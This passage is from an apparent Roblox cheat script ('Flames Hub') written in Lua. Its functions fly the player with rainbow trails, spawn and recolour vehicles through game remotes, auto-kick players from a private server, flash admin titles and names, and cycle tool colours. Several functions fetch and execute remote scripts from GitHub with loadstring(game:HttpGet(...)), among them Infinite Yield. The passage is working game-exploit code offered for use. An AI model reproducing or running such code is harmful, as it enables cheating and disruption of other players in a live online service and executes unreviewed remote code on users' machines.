               local moveVec = ((cam.CFrame.LookVector * (C.F + C.B))
                  + ((cam.CFrame * CFrame.new(C.L + C.R, flyY * 0.5, 0).p) - cam.CFrame.p))

               if moveVec.Magnitude > 0 then
                  vel.Velocity = moveVec.Unit * SPEED
               end
            else
               vel.Velocity = vel.Velocity * 0.9
            end

            gyro.CFrame = cam.CFrame

            local pos = HRP.Position
            if not lastPos or (pos - lastPos).Magnitude > 1 then
               local part = Instance.new("Part")
               part.Anchored = true
               part.CanCollide = false
               part.Material = Enum.Material.Neon
               part.Size = Vector3.new(1,1,(pos - (lastPos or pos)).Magnitude + 2)
               part.CFrame = CFrame.new((lastPos or pos) + ((pos - (lastPos or pos)) / 2), pos)
               local colors = {
                  Color3.fromRGB(255,0,0), Color3.fromRGB(255,128,0), Color3.fromRGB(255,255,0),
                  Color3.fromRGB(0,255,0), Color3.fromRGB(0,255,255), Color3.fromRGB(0,0,255),
                  Color3.fromRGB(128,0,255)
               }
               part.Color = colors[math.random(1, #colors)]
               part.Parent = Workspace
               Debris:AddItem(part, 1)
               lastPos = pos
            end
         end)

         notify("Success", "Fly-2 enabled (PC) | Speed: " .. tostring(getgenv().Fly2Speed), 5)
         return
      end

      local controlModule
      local ok, result = pcall(function()
         return require(plr:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
      end)
      if ok then controlModule = result end

      getgenv().fly2MobileConn = RunService.RenderStepped:Connect(function()
         if not getgenv().Enabled_Flying then return end
         local cam = Workspace.CurrentCamera
         local s = getgenv().Fly2Speed * 50
         local move = controlModule and controlModule:GetMoveVector() or Vector3.zero

         if move.Magnitude > 0 then
            vel.Velocity = (cam.CFrame.LookVector * -move.Z + cam.CFrame.RightVector * move.X) * s
         else
            vel.Velocity = Vector3.zero
         end

         gyro.CFrame = cam.CFrame

         local pos = HRP.Position
         if not lastPos or (pos - lastPos).Magnitude > 1 then
            local part = Instance.new("Part")
            part.Anchored = true
            part.CanCollide = false
            part.Material = Enum.Material.Neon
            part.Size = Vector3.new(1,1,(pos - (lastPos or pos)).Magnitude + 2)
            part.CFrame = CFrame.new((lastPos or pos) + ((pos - (lastPos or pos)) / 2), pos)
            local colors = {
               Color3.fromRGB(255,0,0), Color3.fromRGB(255,128,0), Color3.fromRGB(255,255,0),
               Color3.fromRGB(0,255,0), Color3.fromRGB(0,255,255), Color3.fromRGB(0,0,255),
               Color3.fromRGB(128,0,255)
            }
            part.Color = colors[math.random(1, #colors)]
            part.Parent = Workspace
            Debris:AddItem(part, 1)
            lastPos = pos
         end
      end)

      notify("Success", "Fly-2 enabled (Mobile) | Speed: " .. tostring(getgenv().Fly2Speed), 5)
   end

   getgenv().DisableFly2 = function()
      if not getgenv().Enabled_Flying then
         return notify("Warning", "Fly-2 is not enabled, enable it first!", 5)
      end

      getgenv().Enabled_Flying = false

      if getgenv().fly2InputBegan then getgenv().fly2InputBegan:Disconnect() end
      if getgenv().fly2InputEnded then getgenv().fly2InputEnded:Disconnect() end
      if getgenv().fly2Heartbeat then getgenv().fly2Heartbeat:Disconnect() end
      if getgenv().fly2MobileConn then getgenv().fly2MobileConn:Disconnect() end

      local HRP = get_root(getgenv().LocalPlayer)
      local Humanoid = get_human(getgenv().LocalPlayer)

      if HRP then
         for _, v in ipairs(HRP:GetChildren()) do
            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then v:Destroy() end
         end
      end
      if Humanoid then Humanoid.PlatformStand = false end

      notify("Success", "Fly-2 is now disabled.", 5)
   end

   getgenv().vehicle_stats_viewer_GUI = function()
      local Vehicles = getgenv().Workspace:FindFirstChild("Vehicles")
      if not Vehicles then
         return notify("Error", "Vehicles Folder not found!", 5)
      end
      if getgenv().Vehicle_Stats_GUI_Active then
         return notify("Error", "Vehicle Stats Viewer already running!", 5)
      end

      getgenv().Vehicle_Stats_GUI_Active = true
      getgenv().VehicleUI = {}
      getgenv().vehicle_attr_conns = {}

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = "VehicleStatsGUI"
      ScreenGui.IgnoreGuiInset = true
      ScreenGui.ResetOnSpawn = false
      ScreenGui.Parent = parent_gui
      getgenv().VehicleStatsGUI = ScreenGui

      local MainFrame = Instance.new("Frame")
      MainFrame.Size = UDim2.new(0,300,0,400)
      MainFrame.Position = UDim2.new(0,20,0,100)
      MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
      MainFrame.BorderSizePixel = 0
      MainFrame.Active = true
      MainFrame.Draggable = true
      MainFrame.Parent = ScreenGui
      Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,12)
      repeat task.wait(1) until MainFrame and MainFrame:IsA("Frame") and ScreenGui:FindFirstChildOfClass("Frame")
      wait(0.5)
      dragify(MainFrame)
      getgenv().notify("Info", "Loading Vehicle Stats viewer.", 3)

      function Unhook(vehicle)
         local ui = getgenv().VehicleUI[vehicle]
         if not ui then return end

         local conns = getgenv().vehicle_attr_conns[vehicle]
         if conns then
            for _,c in ipairs(conns) do
               if c then
                  pcall(function()
                     c:Disconnect()
                  end)
               end
            end
         end

         if ui.Frame then
            pcall(function()
               ui.Frame:Destroy()
            end)
         end

         getgenv().vehicle_attr_conns[vehicle] = nil
         getgenv().VehicleUI[vehicle] = nil
      end

      function Hook(vehicle)
         if getgenv().VehicleUI[vehicle] then return end

         local ui = CreateEntry(vehicle)
         getgenv().VehicleUI[vehicle] = ui

         local conns = {}
         getgenv().vehicle_attr_conns[vehicle] = conns

         table.insert(conns, vehicle:GetAttributeChangedSignal("speed"):Connect(function()
            ui.Speed.Text = tostring(vehicle:GetAttribute("speed") or 0)
         end))

         table.insert(conns, vehicle:GetAttributeChangedSignal("acceleration"):Connect(function()
            ui.Accel.Text = tostring(vehicle:GetAttribute("acceleration") or 0)
         end))

         table.insert(conns, vehicle:GetAttributeChangedSignal("handling"):Connect(function()
            ui.Handling.Text = tostring(vehicle:GetAttribute("handling") or 0)
         end))

         table.insert(conns, vehicle:GetAttributeChangedSignal("color"):Connect(function()
            local c = vehicle:GetAttribute("color")
            if typeof(c) == "Color3" then
               ui.Color.BackgroundColor3 = c
            end
         end))

         table.insert(conns, vehicle.AncestryChanged:Connect(function(_, parent)
            if not parent then
               Unhook(vehicle)
            end
         end))
      end

      local Title = Instance.new("TextLabel")
      Title.Text = "Vehicle Stats Viewer"
      Title.Size = UDim2.new(1,-40,0,30)
      Title.Position = UDim2.new(0,10,0,5)
      Title.BackgroundTransparency = 1
      Title.TextColor3 = Color3.fromRGB(255,255,255)
      Title.Font = Enum.Font.GothamBold
      Title.TextSize = 16
      Title.TextXAlignment = Enum.TextXAlignment.Left
      Title.Parent = MainFrame

      local Close = Instance.new("TextButton")
      Close.Text = "X"
      Close.Size = UDim2.new(0,30,0,30)
      Close.Position = UDim2.new(1,-35,0,5)
      Close.BackgroundColor3 = Color3.fromRGB(50,50,50)
      Close.TextColor3 = Color3.fromRGB(255,255,255)
      Close.Parent = MainFrame
      Instance.new("UICorner", Close).CornerRadius = UDim.new(0,8)

      Close.MouseButton1Click:Connect(function()
         getgenv().Vehicle_Stats_GUI_Active = false

         for v in pairs(getgenv().VehicleUI) do
            Unhook(v)
         end

         ScreenGui:Destroy()
      end)

      local Scroller = Instance.new("ScrollingFrame")
      Scroller.Size = UDim2.new(1,-20,1,-90)
      Scroller.Position = UDim2.new(0,10,0,40)
      Scroller.CanvasSize = UDim2.new(0,0,0,0)
      Scroller.ScrollBarThickness = 6
      Scroller.BackgroundTransparency = 1
      Scroller.Parent = MainFrame

      local Layout = Instance.new("UIListLayout")
      Layout.Padding = UDim.new(0,10)
      Layout.Parent = Scroller

      Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         Scroller.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y + 10)
      end)

      local function Validate_Model(v)
         if not v:IsA("Model") then return false end
         if v:FindFirstChild("Base") then return true end
         v:WaitForChild("Base", 3)
         return v:FindFirstChild("Base") ~= nil
      end

      getgenv().get_color_name = function(color)
         if not color or typeof(color) ~= "Color3" then
            return "Unknown"
         end

         local colors = {
            {"White",1,242,243,243},
            {"Grey",2,161,165,162},
            {"Light yellow",3,249,233,153},
            {"Brick yellow",5,215,197,154},
            {"Light green (Mint)",6,194,218,184},
            {"Light reddish violet",9,232,186,200},
            {"Pastel Blue",11,128,187,219},
            {"Light orange brown",12,203,132,66},
            {"Nougat",18,204,142,105},
            {"Bright red",21,196,40,28},
            {"Med. reddish violet",22,196,112,160},
            {"Bright blue",23,13,105,172},
            {"Bright yellow",24,245,205,48},
            {"Earth orange",25,98,71,50},
            {"Black",26,27,42,53},
            {"Dark grey",27,109,110,108},
            {"Dark green",28,40,127,71},
            {"Medium green",29,161,196,140},
            {"Lig. Yellowich orange",36,243,207,155},
            {"Bright green",37,75,151,75},
            {"Dark orange",38,160,95,53},
            {"Light bluish violet",39,193,202,222},
            {"Transparent",40,236,236,236},
            {"Tr. Red",41,205,84,75},
            {"Tr. Lg blue",42,193,223,240},
            {"Tr. Blue",43,123,182,232},
            {"Tr. Yellow",44,247,241,141},
            {"Light blue",45,180,210,228},
            {"Tr. Flu. Reddish orange",47,217,133,108},
            {"Tr. Green",48,132,182,141},
            {"Tr. Flu. Green",49,248,241,132},
            {"Phosph. White",50,236,232,222},
            {"Light red",100,238,196,182},
            {"Medium red",101,218,134,122},
            {"Medium blue",102,110,153,202},
            {"Light grey",103,199,193,183},
            {"Bright violet",104,107,50,124},
            {"Br. yellowish orange",105,226,155,64},
            {"Bright orange",106,218,133,65},
            {"Bright bluish green",107,0,143,156},
            {"Earth yellow",108,104,92,67},
            {"Bright bluish violet",110,67,84,147},
            {"Tr. Brown",111,191,183,177},
            {"Medium bluish violet",112,104,116,172},
            {"Tr. Medi. reddish violet",113,229,173,200},
            {"Med. yellowish green",115,199,210,60},
            {"Med. bluish green",116,85,165,175},
            {"Light bluish green",118,183,215,213},
            {"Br. yellowish green",119,164,189,71},
            {"Lig. yellowish green",120,217,228,167},
            {"Med. yellowish orange",121,231,172,88},
            {"Br. reddish orange",123,211,111,76},
            {"Bright reddish violet",124,146,57,120},
            {"Light orange",125,234,184,146},
            {"Tr. Bright bluish violet",126,165,165,203},
            {"Gold",127,220,188,129},
            {"Dark nougat",128,174,122,89},
            {"Silver",131,156,163,168},
            {"Neon orange",133,213,115,61},
            {"Neon green",134,216,221,86},
            {"Sand blue",135,116,134,157},
            {"Sand violet",136,135,124,144},
            {"Medium orange",137,224,152,100},
            {"Sand yellow",138,149,138,115},
            {"Earth blue",140,32,58,86},
            {"Earth green",141,39,70,45},
            {"Tr. Flu. Blue",143,207,226,247},
            {"Sand blue metallic",145,121,136,161},
            {"Sand violet metallic",146,149,142,163},
            {"Sand yellow metallic",147,147,135,103},
            {"Dark grey metallic",148,87,88,87},
            {"Black metallic",149,22,29,50},
            {"Light grey metallic",150,171,173,172},
            {"Sand green",151,120,144,130},
            {"Sand red",153,149,121,119},
            {"Dark red",154,123,46,47},
            {"Tr. Flu. Yellow",157,255,246,123},
            {"Tr. Flu. Red",158,225,164,194},
            {"Gun metallic",168,117,108,98},
            {"Dark stone grey",199,99,95,98},
            {"Medium stone grey",194,163,162,165},
            {"Light stone grey",208,229,228,223},
            {"Really black",1003,17,17,17},
            {"Really red",1004,255,0,0},
            {"Deep orange",1005,255,176,0},
            {"Alder",1006,180,128,255},
            {"Dusty Rose",1007,163,75,75},
            {"Olive",1008,193,190,66},
            {"New Yeller",1009,255,255,0},
            {"Really blue",1010,0,0,255},
            {"Navy blue",1011,0,32,96},
            {"Deep blue",1012,33,84,185},
            {"Cyan",1013,4,175,236},
            {"CGA brown",1014,170,85,0},
            {"Magenta",1015,170,0,170},
            {"Pink",1016,255,102,204},
            {"Deep orange",1017,255,175,0},
            {"Teal",1018,18,238,212},
            {"Toothpaste",1019,0,255,255},
            {"Lime green",1020,0,255,0},
            {"Camo",1021,58,125,21},
            {"Grime",1022,127,142,100},
            {"Lavender",1023,140,91,159},
            {"Pastel light blue",1024,175,221,255},
            {"Pastel orange",1025,255,201,201},
            {"Pastel violet",1026,177,167,255},
            {"Pastel blue-green",1027,159,243,233},
            {"Pastel green",1028,204,255,204},
            {"Pastel yellow",1029,255,255,204},
            {"Pastel brown",1030,255,204,153},
            {"Royal purple",1031,98,37,209},
            {"Hot pink",1032,255,0,191},
         }

         local closest, closestDist = "Unknown", math.huge
         local r, g, b = color.R * 255, color.G * 255, color.B * 255

         for _, c in ipairs(colors) do
            local _, _, R, G, B = unpack(c)
            local dist = (R - r)^2 + (G - g)^2 + (B - b)^2
            if dist < closestDist then
               closestDist = dist
               closest = c[1]
            end
         end

         return closest
      end

      local function WaitForAttribute(inst, attr, timeout)
         if inst:GetAttribute(attr) ~= nil then
            return inst:GetAttribute(attr)
         end

         local done = false
         local val

         local conn
         conn = inst:GetAttributeChangedSignal(attr):Connect(function()
            val = inst:GetAttribute(attr)
            done = true
            conn:Disconnect()
         end)

         local t = tick()
         while not done and tick() - t < (timeout or 5) do
            task.wait()
         end

         if conn then conn:Disconnect() end
         return inst:GetAttribute(attr)
      end

      local function CreateEntry(vehicle)
         local Holder = Instance.new("Frame")
         Holder.Size = UDim2.new(1,0,0,220)
         Holder.BackgroundColor3 = Color3.fromRGB(35,35,35)
         Holder.Parent = Scroller
         Instance.new("UICorner", Holder).CornerRadius = UDim.new(0,10)

         local Click = Instance.new("TextButton")
         Click.Size = UDim2.new(1,0,1,0)
         Click.BackgroundTransparency = 1
         Click.Text = ""
         Click.Parent = Holder

         Click.Activated:Connect(function()
            getgenv().SelectedVehicle = vehicle.Name
         end)

         local spawn = Instance.new("TextButton")
         spawn.Size = UDim2.new(1,-20,0,28)
         spawn.Position = UDim2.new(0,10,1,-34)
         spawn.Text = "Spawn"
         spawn.BackgroundColor3 = Color3.fromRGB(45,45,45)
         spawn.TextColor3 = Color3.fromRGB(255,255,255)
         spawn.Font = Enum.Font.GothamMedium
         spawn.TextSize = 14
         spawn.Parent = Holder
         Instance.new("UICorner", spawn).CornerRadius = UDim.new(0,8)

         spawn.Activated:Connect(function()
            getgenv().SelectedVehicle = vehicle.Name

            getgenv().Send("spawn_vehicle", vehicle.Name)

            local my_vehicle
            local t = tick()

            repeat
               my_vehicle = get_vehicle()
               task.wait()
            until my_vehicle or tick() - t > 6

            if not my_vehicle then return end

            local col = vehicle:GetAttribute("color")
            if typeof(col) == "Color3" then
               getgenv().Send("vehicle_color", col, my_vehicle)
            end
         end)

         local function label(txt,y)
            local l = Instance.new("TextLabel")
            l.Text = txt
            l.Size = UDim2.new(1,-10,0,18)
            l.Position = UDim2.new(0,5,0,y)
            l.BackgroundTransparency = 1
            l.TextColor3 = Color3.fromRGB(180,180,180)
            l.Font = Enum.Font.Gotham
            l.TextSize = 13
            l.TextXAlignment = Enum.TextXAlignment.Left
            l.Parent = Holder
            return l
         end

         local name = label("Vehicle: "..vehicle.Name,5)
         name.TextColor3 = Color3.fromRGB(255,255,255)
         name.Font = Enum.Font.GothamMedium

         local owner = label("Owner: N/A",24)
         local maxAcc = label("Max Acceleration: N/A",44)
         local maxSpeed = label("Max Speed: N/A",64)
         local acc60 = label("Acceleration (0 To 60): N/A",84)
         local turn = label("Turn Angle: N/A",104)
         local locked = label("Locked: N/A",124)
         local color = label("Color: N/A",144)

         getgenv().VehicleUI[vehicle] = {
            Frame = Holder,
            Owner = owner,
            MaxAcc = maxAcc,
            MaxSpeed = maxSpeed,
            Acc60 = acc60,
            TurnAngle = turn,
            LockedStatus = locked,
            ColorLabel = color
         }
      end

      local function Update(vehicle)
         local ui = getgenv().VehicleUI[vehicle]
         if not ui then return end

         ui.MaxAcc.Text = "Max Acceleration: "..math.floor(vehicle:GetAttribute("max_acc") or 0)
         ui.MaxSpeed.Text = "Max Speed: "..math.floor(vehicle:GetAttribute("max_speed") or 0)
         ui.Acc60.Text = "Acceleration (0 To 60): "..math.floor(vehicle:GetAttribute("acc_0_60") or 0)
         ui.TurnAngle.Text = "Turn Angle: "..math.floor(vehicle:GetAttribute("turn_angle") or 0)
         ui.LockedStatus.Text = "Locked: "..tostring(vehicle:GetAttribute("locked"))

         local c = vehicle:GetAttribute("color")
         if typeof(c) ~= "Color3" then
            c = WaitForAttribute(vehicle, "color", 5)
         end

         if typeof(c) == "Color3" then
            ui.ColorLabel.Text = "Color: "..getgenv().get_color_name(c)
         else
            ui.ColorLabel.Text = "Color: Unknown"
         end

         local owner = vehicle:GetAttribute("OwnerName")
         ui.Owner.Text = "Owner: "..(owner or "Server Spawned")
      end

      local function Hook(vehicle)
         if getgenv().VehicleUI[vehicle] then return end
         if not Validate_Model(vehicle) then return end

         CreateEntry(vehicle)
         Update(vehicle)

         getgenv().vehicle_attr_conns[vehicle] = {}
         for _,a in ipairs({"OwnerName","max_acc","max_speed","acc_0_60","turn_angle","locked","color"}) do
            table.insert(getgenv().vehicle_attr_conns[vehicle],
               vehicle:GetAttributeChangedSignal(a):Connect(function()
                  Update(vehicle)
               end)
            )
         end
      end

      for _,v in ipairs(Vehicles:GetChildren()) do
         Hook(v)
      end

      Vehicles.ChildAdded:Connect(function(v)
         task.defer(function()
            Hook(v)
         end)
      end)

      Vehicles.ChildRemoved:Connect(function(v)
         task.defer(function()
            Unhook(v)
         end)
      end)
   end

   getgenv().check_premium_player = function(plr)
      if plr then
         if plr:GetAttribute("is_verified") == true then
            return true
         else
            return false
         end
      end
   end

   getgenv().bansystem = getgenv().bansystem or {
      enabled = false,
      list = {},
      connection = nil
   }

   function addban(input)
      if not input then return nil end
      if typeof(input) == "Instance" and input.Name then
         local n = input.Name:lower()
         getgenv().bansystem.list[n] = true
         return n
      end
      local q = tostring(input):lower()
      if q == "" then return nil end
      for _,v in pairs(Players:GetPlayers()) do
         local ln = v.Name:lower()
         local ld = v.DisplayName:lower()
         if ln:find(q, 1, true) or ld:find(q, 1, true) then
            getgenv().bansystem.list[ln] = true
            kick_plr(v)
            return ln
         end
      end
      getgenv().bansystem.list[q] = true
      return q
   end

   function removeban(input)
      if not input then return nil end
      local q = tostring(input):lower()
      if q == "" then return nil end
      if getgenv().bansystem.list[q] then
         getgenv().bansystem.list[q] = nil
         return q
      end
      for name,_ in pairs(getgenv().bansystem.list) do
         if name:find(q, 1, true) then
            getgenv().bansystem.list[name] = nil
            return name
         end
      end
      return nil
   end

   function checkban(player)
      local n = player.Name:lower()
      if getgenv().bansystem.list[n] then
         if getgenv().bansystem.enabled then
            kick_plr(player)
         end
      end
   end

   function disablebans()
      getgenv().bansystem.enabled = false
      if getgenv().bansystem.connection then
         getgenv().bansystem.connection:Disconnect()
         getgenv().bansystem.connection = nil
      end
   end

   getgenv().start_bansystem = function()
      if getgenv().bansystem.enabled then return end
      if getgenv().bansystem.starting then return end
      getgenv().bansystem.starting = true

      task.spawn(function()
         for i = 1, 5 do
            if is_localplayer_server_owner() then
               getgenv().bansystem.enabled = true
               getgenv().bansystem.starting = false

               for _, p in ipairs(Players:GetPlayers()) do
                  task.spawn(function()
                     fw(0.2)
                     checkban(p)
                  end)
               end

               if not getgenv().bansystem.connection then
                  getgenv().bansystem.connection = Players.PlayerAdded:Connect(checkban)
               end

               notify("Success", "Ban system enabled.", 5)
               return
            end
            wait(1)
         end

         getgenv().bansystem.starting = false
         notify("Info", "Ban system inactive.", 5)
      end)
   end
   fw(0.1)
   if not getgenv().Ban_System_In_Flames_Hub_Has_Been_Started_Already then
      getgenv().Ban_System_In_Flames_Hub_Has_Been_Started_Already = true  -- actually set it!
      task.spawn(function() start_bansystem() end)
   end

   getgenv().get_server_admin_title_player = function()
      for _, obj in getgenv().Character:GetDescendants() do
         if obj.Name:lower():find("server") and obj.Name:lower():find("admin") and obj:IsA("TextLabel") then
            return obj
         end
      end
   end

   getgenv().flash_server_admin_title_client_sided = function(toggle)
      local localplayer_admin_of_priv_server = getgenv().get_server_admin_title_player()
      if not localplayer_admin_of_priv_server then return end
      local fw = getgenv().FlamesLibrary.wait
      local preset_texts = {"Flames Admin", "Server Admin", "Destroyer Admin", "Owner Admin", "Demon Admin", "Straight Crime", "Powerful Admin", "Creator Admin", "fLaMeS rUlEs", "FLAMES ADMIN"}

      if toggle == true then
         if getgenv().Server_Admin_Text_Title_Changer then
            return getgenv().notify("Warning", "Server Admin Title Text changer is already enabled!", 5)
         end

         getgenv().Server_Admin_Text_Title_Changer = true
         getgenv().FlamesLibrary.spawn("server_admin_title_text_changer_main_loop", "spawn", function()
            while getgenv().Server_Admin_Text_Title_Changer == true do
            fw(0)
               for _, text in ipairs(preset_texts) do
                  localplayer_admin_of_priv_server.Text = text
                  fw(0)
               end
            end
         end)
      elseif toggle == false then
         if not getgenv().Server_Admin_Text_Title_Changer then
            return getgenv().notify("Warning", "Server Admin Title Text changer is not enabled!", 5)
         end

         getgenv().Server_Admin_Text_Title_Changer = false
         getgenv().FlamesLibrary.disconnect("server_admin_title_text_changer_main_loop")
      else
         return 
      end
   end

   if not getgenv().Server_Admin_Text_Title_Changer then
      getgenv().flash_server_admin_title_client_sided(true)
   end

   getgenv().is_tool_colorable = function(tool)
      if tool:IsA("Tool") and (tool:GetAttribute("color1") or tool:GetAttribute("Color1")) then
         return true
      else
         return false
      end
   end

   getgenv().find_backpack_tool = function()
      for _, v in ipairs(getgenv().Backpack:GetChildren()) do
         if v:IsA("Tool") and (v:GetAttribute("color1") or v:GetAttribute("Color1")) then
            return v
         end
      end

      return nil
   end

   getgenv().find_character_tool = function()
      for _, v in ipairs(getgenv().Character:GetChildren()) do
         if v:IsA("Tool") and (v:GetAttribute("color1") or v:GetAttribute("Color1")) then
            return v
         end
      end

      return nil
   end

   getgenv().find_placed_models_tool = function()
      for _, v in ipairs(getgenv().Workspace:FindFirstChild("PlacedModels"):GetChildren()) do
         if v:IsA("Model") and (v:GetAttribute("color1") or v:GetAttribute("Color1")) then
            if v:GetAttribute("owner_id") == getgenv().LocalPlayer.UserId then
               return v
            end
         end
      end

      return nil
   end

   getgenv().find_owned_model = function()
      local folder = Workspace:FindFirstChild("PlacedModels")
      if not folder then return nil end

      local uid = getgenv().LocalPlayer.UserId

      for _, model in ipairs(folder:GetChildren()) do
         if model:IsA("Model") and model:GetAttribute("owner_id") == uid then
            return model
         end
      end

      return nil
   end

   getgenv().rainbow_tool = getgenv().rainbow_tool or function(toggled)
      local colors = {
         Color3.fromRGB(255, 255, 255),
         Color3.fromRGB(128, 128, 128),
         Color3.fromRGB(0, 0, 0),
         Color3.fromRGB(0, 0, 255),
         Color3.fromRGB(0, 255, 0),
         Color3.fromRGB(0, 255, 255),
         Color3.fromRGB(255, 165, 0),
         Color3.fromRGB(139, 69, 19),
         Color3.fromRGB(255, 255, 0),
         Color3.fromRGB(50, 205, 50),
         Color3.fromRGB(255, 0, 0),
         Color3.fromRGB(255, 155, 172),
         Color3.fromRGB(128, 0, 128),
      }

      if toggled then
         notify("Success", "RGB Tool is now enabled.", 5)
         local tool = find_character_tool() or find_backpack_tool() or find_placed_models_tool()

         if not tool then
            getgenv().Send("get_tool", "Gift")
            notify("Warning", "Wait! We're giving you a colorable Tool...", 5)
            fw(0.2)
            tool = find_character_tool() or find_backpack_tool() or find_placed_models_tool()

            if not tool then
               return notify("Error", "Tool still not found after giving you the Gift Tool.", 5)
            end

            if tool.Parent == getgenv().Backpack then
               fw(0.1)
               tool.Parent = getgenv().Character
            end

            for _, color in ipairs(colors) do
               getgenv().Send("tool_color", tool, "color1", color)
               wait()
            end
         end

         if tool.Parent == getgenv().Backpack then
            fw(0.1)
            tool.Parent = getgenv().Character
         end

         getgenv().Rainbow_Tools_FE = true
         while getgenv().Rainbow_Tools_FE do
            tool = find_character_tool() or find_backpack_tool() or find_placed_models_tool()
            if not tool then
               getgenv().Rainbow_Tools_FE = false
               return notify("Error", "Tool unexpectedly disappeared or was destroyed.", 5)
            end
            if tool.Parent == getgenv().Backpack then
               fw(0.1)
               tool.Parent = getgenv().Character
            end
            for _, color in ipairs(colors) do
               if not getgenv().Rainbow_Tools_FE then break end
               getgenv().Send("tool_color", tool, "color1", color)
               wait()
            end
         end
      else
         if not getgenv().Rainbow_Tools_FE then
            return notify("Warning", "RGB Tools is not enabled!", 5)
         end

         getgenv().Rainbow_Tools_FE = false
         notify("Success", "RGB tools has been disabled.", 5)
      end
   end

   getgenv().toggle_name_func = getgenv().toggle_name_func or function(boolean)
      if boolean == true then
         getgenv().Send("hide_name", true)
      elseif boolean == false then
         getgenv().Send("hide_name", false)
      else
         return notify("Error", "Invalid arguments provided.", 5)
      end
   end

   getgenv().flashy_name = function(Toggle)
      if Toggle == true then
         if getgenv().Flashing_Name_Title then
            return getgenv().notify("Warning", "Name-Flasher is already enabled.", 5)
         end

         getgenv().Flashing_Name_Title = true
         while getgenv().Flashing_Name_Title == true do
         wait()
            toggle_name_func(true)
            fw(0.1)
            toggle_name_func(false)
            wait(.1)
         end
      elseif Toggle == false then
         if not getgenv().Flashing_Name_Title then
            return getgenv().notify("Warning", "Name-Flasher is not enabled.", 5)
         end

         getgenv().Flashing_Name_Title = false
         wait(1.5)
         toggle_name_func(false)
      else
         return notify("Error", "Invalid argument(s) provided.", 5)
      end
   end

   getgenv().flames_nameless_admin_ver = function()
      if getgenv().RealNamelessLoaded then
         return notify("Warning", "Nameless Admin (or the Flames Hub version) has already been loaded.", 11)
      end

      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/NamelessAdmin_Flames_Ver.lua'))()
   end

   getgenv().infinite_premium = getgenv().infinite_premium or function()
      if getgenv().GET_LOADED_IY then
         return notify("Warning", "You already have Infinite Premium running.", 5)
      end
      if getgenv().IY_LOADED then
         return notify("Warning", "You already have Infinite Yield running! You cannot and should NOT run both at the same time.", 10)
      end

      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/crazyDawg/refs/heads/main/InfYieldOther.lua'))()
   end

   getgenv().infinite_yield = getgenv().infinite_yield or function()
      if getgenv().IY_LOADED then
         return notify("Warning", "You already have Infinite Yield running.", 10)
      end
      if getgenv().GET_LOADED_IY then
         return notify("Warning", "You already have Infinite Premium running! You cannot and should NOT run both at the same time.", 15)
      end

      loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end

   getgenv().send_msg_menu = getgenv().send_msg_menu or function()
      if getgenv().sendmsgmenu_loaded then
         return notify("Warning", "Send message menu is already loaded!", 5)
      end

      getgenv().sendmsgmenu_loaded = true
      local tween = getgenv().TweenService
      local players = getgenv().Players
      local uis = getgenv().UserInputService

      local gui = Instance.new("ScreenGui")
      gui.Name = tostring(getgenv().randomString())
      gui.ResetOnSpawn = false
      gui.Parent = parent_gui
      gui.IgnoreGuiInset = true

      local message_menu_frame = Instance.new("Frame")
      message_menu_frame.Parent = gui
      message_menu_frame.AnchorPoint = Vector2.new(0.5,0.5)
      message_menu_frame.Position = UDim2.new(0.5,0,0.5,0)
      message_menu_frame.Size = UDim2.new(0,350,0,0)
      message_menu_frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
      message_menu_frame.BackgroundTransparency = 1
      message_menu_frame.BorderSizePixel = 0
      Instance.new("UICorner",message_menu_frame).CornerRadius = UDim.new(0,15)

      dragify(message_menu_frame)

      tween:Create(message_menu_frame,TweenInfo.new(0.22,Enum.EasingStyle.Quad),{
         Size = UDim2.new(0,350,0,360),
         BackgroundTransparency = 0
      }):Play()

      local title = Instance.new("TextLabel")
      title.Parent = message_menu_frame
      title.Size = UDim2.new(1, -110, 0, 35)
      title.Position = UDim2.new(0, 10, 0, 6)
      title.BackgroundTransparency = 1
      title.Text = "> Life Together RP - Message Sender <"
      title.Font = Enum.Font.GothamBold
      title.TextColor3 = Color3.fromRGB(0, 0, 255)
      title.TextTransparency = 1
      title.TextScaled = true
      title.TextXAlignment = Enum.TextXAlignment.Left
      tween:Create(title,TweenInfo.new(0.3),{TextTransparency = 0}):Play()

      local refreshbtn = Instance.new("TextButton")
      refreshbtn.Parent = message_menu_frame
      refreshbtn.Size = UDim2.new(0,70,0,26)
      refreshbtn.Position = UDim2.new(1, -110, 0, 5)
      refreshbtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
      refreshbtn.TextColor3 = Color3.fromRGB(255,255,255)
      refreshbtn.Text = "Refresh"
      refreshbtn.Font = Enum.Font.Gotham
      refreshbtn.TextScaled = true
      refreshbtn.BorderSizePixel = 0
      Instance.new("UICorner",refreshbtn).CornerRadius = UDim.new(0,6)
      refreshbtn.BackgroundTransparency = 1
      refreshbtn.TextTransparency = 1
      tween:Create(refreshbtn,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      local closebtn = Instance.new("TextButton")
      closebtn.Parent = message_menu_frame
      closebtn.Size = UDim2.new(0, 30, 0, 30)
      closebtn.Position = UDim2.new(1, -30, 0, 0)
      closebtn.BackgroundColor3 = Color3.fromRGB(220,50,50)
      closebtn.TextColor3 = Color3.fromRGB(255,255,255)
      closebtn.Text = "X"
      closebtn.Font = Enum.Font.GothamBold
      closebtn.TextScaled = true
      closebtn.BorderSizePixel = 0
      Instance.new("UICorner",closebtn).CornerRadius = UDim.new(0,8)
      closebtn.BackgroundTransparency = 1
      closebtn.TextTransparency = 1
      tween:Create(closebtn,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      local search = Instance.new("TextBox")
      search.Parent = message_menu_frame
      search.Size = UDim2.new(1,-20,0,30)
      search.Position = UDim2.new(0,10,0,50)
      search.BackgroundColor3 = Color3.fromRGB(45,45,45)
      search.TextColor3 = Color3.fromRGB(255,255,255)
      search.Text = ""
      search.PlaceholderText = "Search players..."
      search.Font = Enum.Font.Gotham
